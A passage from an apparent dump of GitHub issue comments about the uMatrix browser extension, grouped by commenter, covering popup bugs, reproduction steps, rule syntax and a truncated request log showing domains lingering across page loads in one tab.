repeatable events for me are using Firefox with espn.com website. If you open the panel, make some changes, refresh the page, the panel will sometimes crash and show as blank. I haven't been able to determine a set of 100% repeatable steps to reproduce however so I hadn't opened a ticket myself.. @Goldich Please read my post on issue #685  which should teach you how to save temporary changes one of two different ways.\n@gorhill Is there any possibility you would use the above instructions I posted on #685  within the wiki? (New bullet point perhaps?) I think a lot of user issues are very similar and just stem from misunderstanding of functionality of the plugin and hoping the walk through I posted for global rule setting is helpful as it shows how to set global and non global rules and permanently save them.. @aspera7 scroll down to the bottom of the uMatrix AMO page and select the down arrows to unhide the 'Development Channel' build. You should be able to add a signed version of the beta via the '+ Add to Firefox' button. Installing via this method will also allow to auto update the extension when new beta builds are released and published to AMO.\n\nPlease close this Issue now as it is Invalid. Thanks. @CollinChaffin Please see my post on #685   that details how to create and save global rules - I think it may be helpful for you. \nIn the case of overriding a blocked domain that is from a hosts file. You can do this from the uMatrix panel while you are still on the uMatrix has prevented the following page from loading landing page.\nSteps below:\n1. Open the uMatrix panel, and click on the red highlighted (blocked) domain name under the 'All' section heading of the uMatrix panel. (The domain should now be highlighted in green)\n2. Save the new rule as described in #685. . @gorhill That is correct and I should have made that more clear in my post, I just referenced the previous post because it explains how to make a rule permanent that I think a lot of users don't understand. \nIf I typed up similar rules for saving rules for one domain, would you be willing to add the walk-through for saving/creating both global and domain bound rules to the Wiki? . Thanks @gorhill I created a new wiki page for demonstration of how to create global and domain specific rules... hopefully this is helpful.. FWIW I have no issue with Firefox 53.0.2 (Not nightly..) and uMatrix 1.0.1b0\n@thomasklash I believe if you add the following rules to your 'My Rules' tab and commit them it should resolve your issue:\ngoogle.com accounts.youtube.com frame allow\ngoogle.com accounts.youtube.com script allow\ngoogle.com content.googleapis.com script allow\ngoogle.com content.googleapis.com xhr allow\ngoogle.com gstatic.com script allow\ngoogle.com gstatic.com xhr allow. ",
    "5t3f4n": "I cannot reproduce. Can you specify the required steps?\nDoes it matter what your about:newtab URL is? Do the new tabs have to come from clicking a link on another page or something?\nuMatrix 0.9.0.0 (release)\nFirefox 38.0\nOS X 10.10.3 (14D136\n. Still can't reproduce. Tried disabling all other extensions and changing my browser.newtab.url back to the default about:newtab too. Was this accidentally fixed with Firefox 38.0 or what?\nI guess it doesn't matter if some people can't reproduce as it still needs to get fixed for those who do.\n. Removal seems like a reasonable approach.\nIMHO it just adds clutter/confusion while providing little to no value.\n. How come when you're trying to display a webm \"in-line\" with the page, such as on https://boards.4chan.org/wsg/catalog the webm gets blocked? You have to allow \"Other\" for 4cdn.org to make them work.\nOpening the video in its own tab makes it work by default however, and no content is seen as either blocked or allowed, like in OP's example.\n. Screenshot showing scripts, frames and everything that should be blocked being loaded from hostnames that shouldn't even be loaded at all. Also notice the scrollbar.\n\n. Can't seem to reproduce using 0.9.0.2-dev.4. What has been changed related to this that fixes it?\n\n. Are you referring to the .woff files?\nCSS is whitelisted by default in uMatrix and I believe that means those will automatically be allowed.\n. The problem goes away if you collapse the hostnames (thus truncating the long ones) so gorhill's guess is probably accurate.\n\n. Same issue here.\nuMatrix 0.9.1.1\nFirefox 38.0.1\nOS X 10.10.3 (14D136)\n. > Blacklisted cookies are not prevented by uMatrix from entering your browser. However they are prevented from leaving your browser, which is what really matters. Not blocking cookies before they enter your browser gives you the opportunity to be informed that a site tried to use cookies, and furthermore to inspect their contents if you wish.\n\nOnce these blacklisted cookies have been accounted for by uMatrix, they can be removed from your browser if you wish so.\nImportant note: Extensions can make web requests during the course of their normal operation. These requests can result in cookies being created in the browser. If the hostname from where a cookie originate is not whitelisted, the cookie will be removed from the browser by uMatrix if this option is checked. So be sure that the hostname(s) with which an extension communicate is whitelisted.\n. @gorhill \nYou mean it shows blank.about-scheme while on a Yahoo page?\n\nI think he does. If you look closely at this screenshot you can see that it's definitely not a blank page behind the matrix. I think it's incorrectly displaying blank.about-scheme.\n\n. This is by no means a solution, but a workaround for the time being.\nPress CMD+F or CTRL+F then type either allow or block in and select Highlight All.\n. I get this too but only for hpHosts\u2019s Ad and tracking servers\u200e but it seems the site is having issues.\n\nService Unavailable\nHTTP Error 503. The service is unavailable.\n\nNot a uMatrix issue. At least not in my case.\nEdit: it works now.\n. > Does this affect other addons?\nI don't know. uMatrix and uBlock Origin are my only extensions that have popups.\n\nSomeone with dev skills could try to add opacity: 1; in popup.css, then create a local package and install it in SeaMonkey and see if this helps.\n\nI'm no expert but I tried this and it had no result. But perhaps I repackaged it wrong or something.\n\nBy the way, I don't have access to an OSX install, so I can't investigate OSX-specific issues.\n\nWould you consider installing OSX in a VM?\n. > Try Ghostery, it has an HTML-based popup.\nAlright I tried with Ghostery (version 5.4.8.1) and it has no transparency.\n\nThat will be much easier for you to install Ghostery than for me to figure a way to obtain and run OSX.\n\nOf course. I didn't mean you should go through the trouble solely for this issue but figured it might be valuable for you to have the ability to test-drive your extensions on OS X in general. I could hook you up with remote access to an actual Mac if you're interested but don't want to fiddle with VMs. \n. > Can you see if this helps?\nUsing uBlock Origin 1.1.2b1 I see no visible difference. Transparency is still there.\n\nWhere would I find a version of OSX installable in a VM if ever I want to try OSX?\n\nThis is a fairly popular thing to do so simply search the web using your preferred search engine for \"yosemite [name-of-VM]\" e.g. https://startpage.com/do/search?q=yosemite+virtualbox\n. Just letting you know that the problem still occurs as of uMatrix 0.9.2.2b5.\n. I sometimes see this in error console. Is it related to this in any way?\nError: TypeError: matrixSnapshot.userSettings is undefined\nSource File: chrome://umatrix/content/js/popup.js\nLine: 76\n. Someone posted a link to https://addons.mozilla.org/firefox/addon/tiny-javascript-debugger here but the post has since been removed for whatever reason. Reposting the link in case it's of any help.\n. @lunboks: In the uMatrix Dashboard, you can go to the Privacy tab and toggle \"Delete blocked cookies\". This behavior may or may not be more in line of what you were expecting. Make sure you click the (?) button to reveal and read the info first though.\n. uMatrix can block all types of media as well as far as I'm aware, the difference is that uMatrix categorize them as other instead of media. Open both request loggers and compare, look for the item and you should hopefully see it in both albeit under different types.\nThere used to be a merit to having uMatrix handle malware domains and such, since uBlock Origin would still load the root document. But since uBlock Origin introduced strict blocking, this is no longer the case as is explained in this page. The recommendation seems to be to leave malware domains in both uMatrix and uBlock Origin, but this page is need of an update so take it with a grain of salt.\n. > URL?\n\nBrowser/version?\n\nI don't know any example of websocket but you I can give STR for a media one.\n- Go to https://boards.4chan.org/wsg/catalog. *\n- Open any thread that contains at least one .webm video.\n- Click to play the .webm video \"in-line\" with the page.\n- You now have an other in uMatrix and a media in uBlock Origin for the same .webm video.\nuMatrix 0.9.2.1\nuBlock Origin 1.2.0\nFirefox 41.0.1\nOS X 10.11 (15A284)\n* Keep in mind that although this is the Worksafe GIF board, 4chan is still 4chan.\n. That's odd. uMatrix doesn't even have a cell for media so I can't imagine what else it would fall under.\nHere are some screenshots of what I mean:\nuMatrix showing other.\nuBlock Origin showing media.\nBut I feel I've taken this slightly off topic now because the biggest issue here is requests not appearing at all, not being categorized differently, which I cannot reproduce.\nI'm seeing a websocket in uBlock Origin from live.github.com/_sockets/[\u2026] and that same URL is showing up in uMatrix as other.\nEdit: It appears it's only visible when viewing All and not in Behind the scene.\n. @Diazonium it's actually not random at all, and it's very easy to reproduce reliably.\n- Be in this very thread\n- Left-click on the image you included in the first post\n  - It will open in a new tab\n- The scope for the thread has changed from github.com to cloud.githubusercontent.com\n- Things like previewing posts is now broken until you reload/navigate away from the site*\n* Assuming you don't allow scripts/xhr etc. from anywhere\nI definitely think your issue is related to the one gorhill linked, and you probably encountered it by clicking on a link in the news feed or something.\n. I had the same issue with SeaMonkey, icon also disappearing seemingly at random. Does uMatrix have a way to \"force legacy toolbar button\" like uBlock Origin does?\n. > an option to deny cookies entirely, preventing them to enter the browser altogether, should be available\nIt's already available, in your browser settings. There is no reason for uMatrix to duplicate this feature IMHO.\n. I have this issue too, and have had it for as long as I can remember.\nIt's been present since I was running El Capitan and whatever version of Firefox/uMatrix I was running then. I tried troubleshooting it back then (clean install of macOS + Firefox + uMatrix) but I could not pinpoint what causes it, it appears sporadically.\nWhen it happens, most keyboard shortcuts stop working, for example \u2318+Q (Quit) as well as some menu bar items. I have to quit by right-clicking the Dock icon when this happens.\nAside from having done a bit more troubleshooting compared to OP, there is little I can add besides a \"me too\" unfortunately. . ",
    "Blutgang": "Tends to happen (rarely) when opening a new tab (not the first new tab I've opened). Hard to reproduce consistently. Firefox 37.0.2\n\n. The six step process by Raymond was fixed. However, I still see this issue when opening a new tab. Firefox 38.0 uMatrix 0.9.0.1\n\n(Not sure if this is related) Browser console: TypeError: matrixSnapshot.userSettings is undefined popup.js:76:4\nEdit: Seems to be fixed in the latest dev. Thanks Raymond!\n. uMatrix 0.9.1.1 (FF) does detect the flash plugin if you do click on the click-to-play. On the other hand uMatrix 0.9.1.1 (Chrome) will show other instead of plugin due to the unresolved bug (https://code.google.com/p/chromium/issues/detail?id=410382). uMatrix 0.8.1.4 will detect plugin before the flash plugin is activated. After flash is activated on Chrome, uMatrix 0.8.1.4 will show other and plugin. \n. @gorhill Can you reproduce with these steps?\n1. Go to about:preferences\n2. Click on the drop-down menu for When Firefox starts: and change it to Show my home page\n3. Set your Home Page to ~~about:blank|~~https://www.yahoo.com/\n4. Restart Firefox\n5. Firefox should open with ~~about:blank and~~ yahoo.com tab~~s~~ with the blank.about-scheme scope\nEdit: Not sure if it this is related... Repeat the same steps above and\n6. Go to about:addons and you will see that the scope is also blank.about-scheme instead of addons.about-scheme\n. ",
    "dboshardy": "I am on chrome and the window looks like this persistently.  It never displays correctly.  Clicking the buttons doens't do anything, the matrix is never shown. \n. @gorhill, awesome, thanks!\n. I'm getting this as well.\n- Ubuntu 14.04\n- Chrome Version 40.0.2214.111 (64-bit)\nInteresting, as I have a nearly identical setup on another PC and it works fine. The only difference is that I never closed Chrome to update today on that machine.  Perhaps the update of Chrome is causing this?\n. The only errors I see are related to content on the page not loading due to being blocked.\n. Couldn't find Reload in the console window.  However, when I right click on the uMatrix button on the toolbar and click \"Inspect popup.\" I get this:\nUncaught SyntaxError: Use of const in strict mode. ... popup.js:36\n. Yes, from the Chrome store.\n. Getting an error from the Chrome store:\nPackage is invalid. Details: 'Default locale is defined but default data couldn't be loaded.'\n. Nope.  It tries to download the .crx file then throws that error.\n. Ok.  It's probably an issue on my end.  Thanks for the quick fix!\n. ",
    "absorber": "I confirm observing normal operation once I un-installed the extension and re-installed it through the Chrome store.\nThank you for your swift operation.\n. ",
    "eproxus": "Sorry, my bad. Didn't realize there was an update.\n. @mailinglists35 Since there is a reload button in the popup, your argument is void. It's the same amount of clicks in both the old and new version (since auto reload required a click on the page to trigger). The only difference is that the popup stays open, which allows you to continue filtering until the page works.\n. ",
    "vzjrz": "This seems to be fixed for me. When loading http://video.webmfiles.org/big-buck-bunny_trailer.webm firefox shows the video ui but when clicking play an other request is block and the video does not play.\nEdit: Nevermind I just tried it on a new firefox profile and the problem persists. It seems the use of https://addons.mozilla.org/en-us/firefox/addon/flashstopper/ on my default profile intercepted the autoplay which then gave time for umatrix to block the video?\n. Just tried it on windows 7 and works for me.\n. If you're gonna trust any link you click on to allow certain requests then I don't see the point in only allowing from the exact site you're on and not its other subdomains. If you have reasons to suspect google's other subdomains then by all means go ahead and block those.\n. Whitelisting all cdn.* matches seems a little unsafe. Why not just whitelist cdn you know and trust like * ajax.googleapis.com script allow.\n. Yeah really strange also got the same thing. The url you used though was: http://www.parano.be/v15/desktop.php\n. I use https://addons.mozilla.org/en-us/firefox/addon/referrer-control/ and it works great.\n. For uk.businessinsider.com/tony-robbins-how-to-defeat-donald-trump-2015-10 it seems that the player needs a domain (ooyala?) that is blacklisted in one of the host files. Setting every column to green will not unblock blacklisted domains in host files you'll have to whitelist them manually.\nFor https://www.europcar.at/en/fleet I could not get the pop-up window to load at all (would just display a white blank) even on a clean firefox/chrome profile. Didn't see any https://go.trouter.io/v2/a connections either. It might be on their end.\nDon't really know what you mean with the github case.\nHave you scanned your system for malware? Maybe an extension is messing with you setup.\n. Can you see it here: https://jsfiddle.net/vu4fvn8w/embedded/result/\nYou'll need to whitelist jshell.net frames\n. @Diazonium yeah sorry about that they seemed to have changed the site I can't reproduce either.\n. githubusercontent.com and s3.amazonaws.com are all in the Public Suffix List: https://publicsuffix.org/list/\n. Should be under 'My Rules'. Click edit and type away.\n. You can just do www.twitch.tv 192.16 other allow\n. I see nothing wrong with this: \n\n. What you're looking for is default-allow mode. Choose one of these settings:\n- This will completely turn off umatrix everywhere: matrix-off: * true\n- This will allow everything everywhere but still block stuff in the host lists: * * * allow (<-- this is probably your best option)\nAll these setting can be applied in the UI by changing the scope to * (so that the rules will apply to everysite) and then either: clicking the power button to turn off umatrix then save, or clicking the all cell to turn it green then save.\nLook at the old documentation for better documentation: https://github.com/gorhill/httpswitchboard/wiki\n. It wouldn't make a difference if you also use ublock but I wouldn't use ublock's advance mode (dynamic filtering) since umatrix is basically super-advance-mode. I wouldn't personally use umatrix they way you want to use it but if you really need to set umatrix to default-allow I would just set 1st-party to green instead of all in the above rule. It really depends how much trust and privacy you want.\nhttps://github.com/gorhill/httpswitchboard/wiki/How-to-use-HTTP-Switchboard:-Two-opposing-views\n. You don't have any other scripts or addons running because I'm not seeing this.\n. Not possible with umatrix but you can use ublock.\n. @Snapy I tried removing that rule but it still runs js. I even removed everything except * * * block and still nothing.\n. @debiangirl Yeah that would disable javascript everywhere but it wouldn't allow me to quickly control it on a case by case basis like I do with umatrix.\n. ",
    "SXZ1": "It looks like I came across the same problem. Nightly 01-04-17, disable 1st party in uMatrix 0.9.9b9. Open these links in a new tab:\nhttps://secure.fanboy.co.nz/test.mp4\nResult: video is blocked, video is listed in media\nhttps://2ch.hk/s/src/2002539/14906383487550.webm\nResult: video is not blocked, video is not listed anywhere including media. I installed uMatrix.webext.zip 0.9.9b7 without any problems in Nightly 30-03-17: set xpinstall.signatures.required to false, download uMatrix.webext.zip, open about:addons - click on gear icon - Install from file - Select zip file. . > This is a limitation known and documented for years\nI guess there is no such limitation in latest Nightly+uMatrix WebExtension?. ",
    "oherrala": "I'm sorry about the bad tone in my opening message.\nI can't provide any research into this subject. The colors are subjective to personal taste. But I can say the old greyscale colors hit the spot for me (and maybe others).\nI really loved the greyscale colors where black was \"blocked\", and white was \"allowed\". It looked really great and it was intuitive (from the day one for me).\n. ",
    "Ineluctable": "This would be really useful to have. The current process isn't too hard - 3 clicks to open the UI, whitelist, and reload compared to uMatrix's 1 click - but sometimes they chain multiple redirects sites together which can be a pain.\n. ",
    "rainbowdesign": "This is from may 2015 so nearly a year old when will it come?\n. Oh i found which rule to remove i did not recognize it because in that field there is no item (cookie, script)... Its just not easy to see how to do this\n. Add the explanation and the screen to the the error message an i would consider the issue resolved ;)\n. ",
    "hydroid7": "What about this box? It gives a hint for the normal user, who just want to visit the PlayStore.\n\nHere is the source code of the main-blocked.html. Since Github doesn't support *.html files, its a txt.\nmain-blocked.txt\n. ",
    "qwertier": "\nI didn't see the point of a temporary bypass, because even if one allows the root document to bypass matrix filtering, all the secondary resources for the site will be blocked, which means in all likelihood the page would be severely broken, which means one will have to play with the matrix anyways, hence no real time saving.\n\nI don't see any broken pages in my case. As for this example there's no any rules which need user's interaction in uMatrix popup window! \nI see two solutions to make users happy:\n- Enable the domain for fixed time (domain is an address with all the \"secondary resources\")\n- Enable the domain only for this page (better solution)\n. ",
    "dubitably": "Throwing in my own two cents, it took me quite a while to figure out that the row headers on the matrix doubled as a default value setters for the columns and as toggles for requests to the domains themselves. \nMaybe the best solution to this issue involves a little reworking of the matrix UI, either an extra column, or some extra toggle, or something? Maybe something in that top row above the matrix... . ",
    "RobotCaleb": "Thanks. I searched recipes, but not preset. I missed that issue.\n. ",
    "AsukaLangleyfag": "Well, seems like the problem was in how uMatrix dims blocked frames, it makes my firefox not responding, because no problem with Policeman.\n. I misstype, uMatrix of course. \n\nAfter this - \"firefox not responding\". Sometimes it does, but sometimes it doesn't. Also CPU usage rises. No problem with allowed frames from repo.antergos.info\n. lots of \"Error in parsing value for 'background-image'.  Declaration dropped.\" by http://build.antergos.com/static/css/skin-blue.css\nand lot of errors from http://build.antergos.com/static/js/bootstrap/dist/css/bootstrap.css too. Without - only xhr request every 10 seconds, yeah.\n. Thank you for your time. So, as it's not a uMatrix bug - closed.\n. Sorry, invalid one.\n. ",
    "ikeboy": "This is how it looks for an example site (all sites break)\n\n. So how should I fix this? It shouldn't change behavior like that, anyway.\n. That worked, thanks. Should the default be changed (umatrix should automatically add that rule if it doesn't exist upon this update?)\n. > If I were to create a root rule by default if none is present, it would be * * * block anyways, that's the one present in a new install of uMatrix -- this did not change. So you would end up with the same issue. Just be sure to never remove your root rule, so that it can not be overriden.\nI still think the rule should be added when updating. If I'd seen * * * block in my rules, I'd have removed it and not filed an issue. So someone who checks their rules should be able to tell that default behavior has changed.\n. ",
    "Alpengreis": "Here is an example, that always works, at least if I not wait a (very) long time after load the g+ site:\nA) Load URL\nhttps://plus.google.com/107545467275966756564/posts?hl=de\nB) Then URL\nhttp://www.swissvpn.net/\nThe screenshot from uMatrix ...\n\nNOTE: Even a hard reload has no effect ...\nThe screenshot from uBlock ...\n\nHere a normal reload (not hard) has effect ...\n\nAnd here the log (truncated) ...\n\n03:08:31  cookie  http://www.swissvpn.net/{persistent-cookie:lang_cookie}\n03:08:31  cookie  http://google.com/{persistent-cookie:HSID}\n... more such or related links snipped ...\n03:08:31  cookie  https://plus.google.com/{persistent-cookie:OTZ}\n03:08:30  other   https://talkgadget.google.com/u/0//diagnostics/?diagno\n... more such or related links snipped ...\n03:08:30  other   https://csi.gstatic.com/csi?v=3&s=hangouts&action=&it=w\n03:08:30  script  http://www.swissvpn.net/{inline_script}\n03:08:30  image   http://www.swissvpn.net/images/gr_bg.gif\n... more such or related links snipped ...\n03:08:30  xhr https://play.google.com/log?format=json&u=0\n03:08:30  other   https://plus.google.com//diagnostics/?diagnostics=%5B%\n03:08:30  other   https://plus.google.com//diagnostics/?diagnostics=%5B%\n03:08:30  other   https://plus.google.com//diagnostics/?diagnostics=%5B%\n03:08:30  css http://www.swissvpn.net/svpntxt.css\n03:08:30  other   https://plus.google.com//diagnostics/?diagnostics=%5B%\n... more such or related links snipped ...\n03:08:30  other   https://csi.gstatic.com/csi?v=3&s=oz&action=profload_st\n03:08:30  xhr https://plus.google.com//stream/markitemread/?hl=de&oz\n03:08:30  xhr https://play.google.com/log?format=json\n03:08:30  doc http://www.swissvpn.net/\nhttp://www.swissvpn.net/\n03:08:29  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:29  xhr https://play.google.com/log?format=json&u=0\n03:08:29  xhr https://play.google.com/log?format=json\n03:08:28  other   https://ssl.gstatic.com/chat/sounds/incoming_video_shor\n03:08:28  other   https://ssl.gstatic.com/chat/sounds/incoming_video_long\n03:08:28  other   https://ssl.gstatic.com/chat/sounds/incoming_message_eb\n03:08:27  xhr https://talkgadget.google.com//scs/talk-static//js/k=\n03:08:26--    image   https://ad.doubleclick.net/activity;src=2542116;type=so\n03:08:26  cookie  https://plus.google.com/{localStorage}\n03:08:26  frame   https://plus.google.com//blank\n03:08:25  script  https://ssl.gstatic.com/accounts/o/3655170095-postmessa\n03:08:25  script  https://oauth.googleusercontent.com/gadgets/js/core:rpc\n03:08:25  script  https://plus.google.com/u/0//notifications/frame?sourc\n03:08:25  cookie  https://plus.google.com/{localStorage}\n03:08:25  css https://fonts.gstatic.com/s/roboto/v15/oMMgfZMQthOryQo9\n03:08:25  image   https://ssl.gstatic.com/s2/oz/images/notifications/spin\n03:08:25  frame   https://accounts.google.com/o/oauth2/postmessageRelay?p\n03:08:25  script  https://apis.google.com//scs/apps-static//js/k=oz.gap\n03:08:25  css https://plus.google.com//scs/apps-static//ss/k=oz.sbw\n03:08:25  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:25  script  https://apis.google.com//scs/apps-static//js/k=oz.gap\n03:08:25  frame   https://plus.google.com/u/0//notifications/frame?sourci\n03:08:24  script  https://plus.google.com/hangouts//hscv?pvt=AMP3uWbBIKT\n03:08:24  cookie  https://plus.google.com/{localStorage}\n03:08:24  xhr https://plus.google.com//scs/talk-static//js/k=wcs.ha\n03:08:24  script  https://apis.google.com/js/client.js\n03:08:24  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:24  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:24  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:24  frame   https://plus.google.com/hangouts//hscv?pvt=AMP3uWbBIKT\n03:08:24  image   https://lh3.googleusercontent.com/-Sbi02TE9dLg/U97nH3FD\n03:08:24  image   https://lh3.googleusercontent.com/proxy/RcgZvDoRzsSPg98\n03:08:24  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n03:08:24  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:24  script  https://talkgadget.google.com/u/0/talkgadget//frame?v=\n03:08:24  image   https://ssl.gstatic.com/ui/v1/activityindicator/offline\n03:08:24  image   https://ssl.gstatic.com/chat/babble/sprites/common-301c\n03:08:23  xhr https://8.client-channel.google.com/client-channel/chan\n03:08:23  image   https://ssl.gstatic.com/ui/v1/activityindicator/loading\n03:08:23  xhr https://plus.google.com//stream/getactivities/?hl=de&o\n... more such or related links snipped ...\n03:08:23  xhr https://8.client-channel.google.com/client-channel/gsid\n03:08:23  script  https://talkgadget.google.com/u/0/talkgadget//frame?v=\n03:08:23  xhr https://8.client-channel.google.com/client-channel/gsid\n03:08:23  frame   https://talkgadget.google.com/u/0/talkgadget//frame?v=\n03:08:23  script  https://8.client-channel.google.com/client-channel/clie%\n03:08:23  frame   https://talkgadget.google.com/u/0/talkgadget//frame?v=\n03:08:23  script  https://apis.google.com/js/api.js\n03:08:23  script  https://8.client-channel.google.com/client-channel/js/1\n03:08:23  script  https://clients4.google.com/invalidation/lcs/client?xpc\n03:08:23  frame   https://8.client-channel.google.com/client-channel/clie%\n03:08:22  xhr https://plus.google.com//profiles/getprofilepagephotos\n03:08:22  script  https://talkgadget.google.com/u/0/talkgadget//chat?cli0\n03:08:22  xhr https://talkgadget.google.com//scs/talk-static//ss/k=\n03:08:22  cookie  http://talkgadget.google.com/{session-cookie:llbcs}\n03:08:22  script  https://talkgadget.google.com//scs/talk-static//js/k=\n03:08:22  frame   https://talkgadget.google.com/u/0/talkgadget//chat?cli0\n03:08:22  script  https://talkgadget.google.com//scs/talk-static//js/k=\n03:08:22  xhr https://plus.google.com//socialgraph/lookup/people/?if\n03:08:22  image   https://ssl.gstatic.com/s2/oz/images/circles/cpw-7de38e\n03:08:21  cookie  https://clients5.google.com/{localStorage}\n03:08:21  xhr https://plus.google.com//profiles/getfollowercount/101\n03:08:21  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n03:08:21  xhr https://plus.google.com//people/notify?soc-app=1&cid=0\n03:08:21  script  https://talkgadget.google.com/u/0/talkgadget//host-js?\n03:08:21  frame   https://talkgadget.google.com/u/0/talkgadget//blank\n03:08:21  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n03:08:21  image   https://lh3.googleusercontent.com/-HDk4PX0tPv8/AAAAAAAA\n03:08:21  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n... more such or related links snipped ...\n03:08:21  xhr https://play.google.com/log?format=json\n03:08:21  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n... more such or related links snipped ...\n03:08:20  image   https://ssl.gstatic.com/s2/oz/images/sprites/profiles_s\n03:08:20  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n... more such or related links snipped ...\n03:08:19  script  https://apis.google.com//scs/apps-static//js/k=oz.gap\n03:08:19  script  https://plus.google.com/107545467275966756564/posts?hl=\n03:08:19  cookie  https://plus.google.com/{localStorage}\n03:08:19  image   https://ssl.gstatic.com/s2/oz/images/sprites/collection\n... more such or related links snipped ...\n03:08:19  css https://fonts.gstatic.com/s/roboto/v15/El-bgsteBznJNL5p\n03:08:19  image   https://ssl.gstatic.com/s2/oz/images/sprites/stream_sho\n... more such or related links snipped ...\n03:08:19  xhr https://plus.google.com//scs/apps-static//js/k=oz.hom\n03:08:19  script  https://www.gstatic.com/og//js/k=og.og.en_US.fC5iiuc_6\n03:08:19  css https://fonts.gstatic.com/s/roboto/v15/tZdhd9Zzj0I2MwoD\n03:08:19  css https://fonts.gstatic.com/s/roboto/v15/N5Lbe1fynPA1KT8B\n03:08:19  image   https://lh5.googleusercontent.com/-HDk4PX0tPv8/AAAAAAAA\n03:08:19  image   https://ssl.gstatic.com/gb/images/v1_376447c3.png\n03:08:18  image   https://images-pos-opensocial.googleusercontent.com/gad\n... more such or related links snipped ...\n03:08:18  image   https://maps-api-ssl.google.com/maps/api/staticmap?size\n... more such or related links snipped ...\n03:08:18  image   https://s2.googleusercontent.com/s2/favicons?alt=p&doma\n03:08:18  image   https://lh3.googleusercontent.com/proxy/6UPOhVeV7V5x3zA\n... more such or related links snipped ...\n03:08:18  image   https://ssl.gstatic.com/s2/oz/images/logo/2x/googleplus\n03:08:18  script  https://plus.google.com//scs/apps-static//js/k=oz.hom\n03:08:18  css https://plus.google.com//scs/apps-static//ss/k=oz.hom\n03:08:18  cookie  http://google.com/{persistent-cookie:HSID}\n... more such or related links snipped ...\n03:08:18  cookie  https://plus.google.com/{persistent-cookie:OTZ}\n03:08:17  doc https://plus.google.com/107545467275966756564/posts?hl=\nhttps://plus.google.com/107545467275966756564/posts?hl=de\n03:08:09  cookie  http://google.ch/verify{persistent-cookie:SNID}\n... more such or related links snipped ...\n03:08:08  other   https://www.google.ch//chrome/newtab/manifest?espv=2&i\n... more such or related links snipped ...\n03:08:08  image   https://www.google.ch/images/srpr/logo9w.png\n03:08:08  script  https://www.google.ch/xjs//js/k=xjs.ntp.en_US.BFZSFxB-\n... more such or related links snipped ...\n03:08:08  cookie  http://google.ch/{persistent-cookie:PREF}\n03:08:08  cookie  http://google.ch/{persistent-cookie:PREF}\n03:08:08  other   https://plus.google.com//diagnostics/?diagnostics=%5B%\n... more such or related links snipped ...\n03:08:08  doc https://www.google.ch//chrome/newtab?espv=2&ie=UTF-8\nhttps://www.google.ch//chrome/newtab?espv=2&ie=UTF-8\n\nNOTE: loaded BOTH through bookmark, NOT over omnibox ...\nAbout your suspect \"Use a prediction service to help complete searches and URLs...\". It SEEMS, it's not the reason after a test, but I make further tests (with empty cache first, restart browser, and some other things). I'll report it here, IF this is responsible, of course!\nThank you for your help!\nAlpengreis\n. I have now the same combo uBlock & uMatrix in Fx (~~plus NoScript for some things~~), and I was able to reproduce this behaviour too ...\n. Gorhill, could you please check this behaviour? It's such an annoying thing and can be even dangerous! It's the case in Chrome and Firefox. And ist even the the case in a complete new (clean) installation on Win 10 ...\nThank you!\n. I understand the tech explanation, thank you, Gorhill!\nThe problem is, if I load a new page in the same tab, and I save a new rule for this page, I have included a possible unwanted domain. AFAIK, I never had this behaviour in NoScript (it's not the very same, I know, nevertheless ...).\nFor example I load a Google Plus page and after my local Router page, I see there the google domain. But this site has no link to google. It's how you said: It's only in the same tab as g+ before was. If I do not check this explicit (load in new tab) and I save this (allow google), I have a \"false\" record.\nIn daily work, this means for me: I have EVERYTIME to close the actual tab first, resp. I have to load a new tab, before I load a new page - to ensure, that on the new page are only \"valid\" domains listed.\nAs workaround I had used the Tab Mix Plus, which opens normally automatically a new tab. But I would like to reduce plugins now. BUT: the situation is not very user friendly at this point.\nI hope, you understand me (enough), my english is not very good :-)\nHowever: I hope you can change somehow this behaviour, else I must live with it ...\nInfo: I mean NOT REAL included links, such as google or whatever (they are in many many pages, I know that).\nAlso interesting: why can NoScript handle this proper? Is this also by design?\nKind regards!\n. Okay, then I leave my workaround active, not soooo a big thing.\nThank you, Gorhill!\nPS: For other users with Firefox: I use the AddOn \"Tab Mix Plus\" and configured it to open relevant things in NEW TABS - so, it's a practicable workaround for this behaviour ...\n. This seems to be fixed now in uBlock but not yet in uMatrix! Could you fix it in uMatrix too, please? This would be so important, to avoid extra AddOn!\n. Thanks for answer, gorhill! I use also latest Dev (with latest Fx Release (42.0)).\nI had reasked, because it's NO MORE the case with uBlock (before it was).\nWould it be possible to have the same behaviour in uMatrix as in uBlock? The problem is, it's really difficult to handle these (unnecessary? or at least undesired) domains in the matrix, even if they are not in uBlock ...\nOr in other words: how can I decide that such domains are from the webpage itself or not - without other tools? Or: if such domains are there, I will not make a relation the page itself, if it's not from the page source.\nThe only possibility to avoid this behaviour with uMatrix is: I have to look ALWAYS in uBlock OR I have to open EACH link in a new Tab. In Fx, this is relatively easy with Tab Mix Plus (TMP), but with Chrome, I don't know an extension for this (or they does not work (correctly) - so it's necessary to make it ALWAYS \"manually\".\nSo uBlock makes it \"okay\", NoScript makes it okay, uMatrix not.\nOr exist any reason to leave this so in uMatrix?\nMany greetings!!\n. Okay, thanks. It WAS also the case with uBO as I had made my first posting here ...\nHowever, have a nice week yet, gorhill!\n. @gorhill \nYes, you have right. Indeed uBlock should display the \"unwanted Domain\" too! This is the result after loading first google maps (https://www.google.ch/maps/) and then http://www.swissvpn.net/ in the SAME tab.\n\n\nThis is really annoying to not have at least the same result in uMatrix and uBO.\n. I have news about this ...\nIt seems it's NOT the beforeunload listener!\nI have disabled this in Firefox (latest Release) in the config (dom.disable_beforeunload = true).\nXHR seems to be involved. I had allowed on the google maps page ALL except XHR. After loading swissvpn.net NO google entry. After switch the XHR also to allow: BOOM, google is present after loading swissvpn.net in same Tab.\nPS: Could this have to do something with the AV Scanner and/or BehindTheScene?\nPPS: Another idea is the onreadystatechange ...\nhttps://developer.mozilla.org/en-US/docs/Web/Events/readystatechange\nwhich I have found in the Google Page Source Code.\n. Interesting. I had to install Chrome again. I installed the v47.0.2526.80 m (64-bit). There, this problem does NOT exist (tried with the same links above). Even not in the log, as you can see here 